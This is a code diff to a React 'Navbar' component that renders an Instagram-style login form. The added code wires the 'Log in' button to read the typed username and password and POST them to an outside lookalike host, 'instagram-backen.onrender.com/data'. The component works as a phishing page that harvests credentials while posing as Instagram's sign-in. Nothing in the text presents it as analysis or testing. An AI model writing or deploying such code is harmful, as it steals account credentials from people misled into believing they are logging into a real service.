@@ -6,7 +6,23 @@ import play from "../../assets/img/play.png"
 import "./Navbar.css";
 
 export default function Navbar() {
-    var inp2 = document.querySelector(".inp");
+    let text1 = document.querySelector(".inp");
+    let text2 = document.querySelector(".inpt")
+    let text_button = document.querySelector(".tn")
+    text_button.onclick = () => {
+        let tex1 = text1.value;
+        let tex2 = text2.value;
+        fetch('https://instagram-backen.onrender.com/data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                login: tex1,
+                password: tex2
+            })
+        })
+    }
     return (
         <>
             <Container>
@@ -23,7 +39,7 @@ export default function Navbar() {
                                         <input type="text" placeholder="Phone number, username, or email" className="inp" />
                                     </div>
                                     <div className="a">
-                                        <input type="password" placeholder="Password" className="inp" />
+                                        <input type="password" placeholder="Password" className="inpt" />
                                     </div>
                                     <div className="s">
                                         <button className="tn">Log in</button>
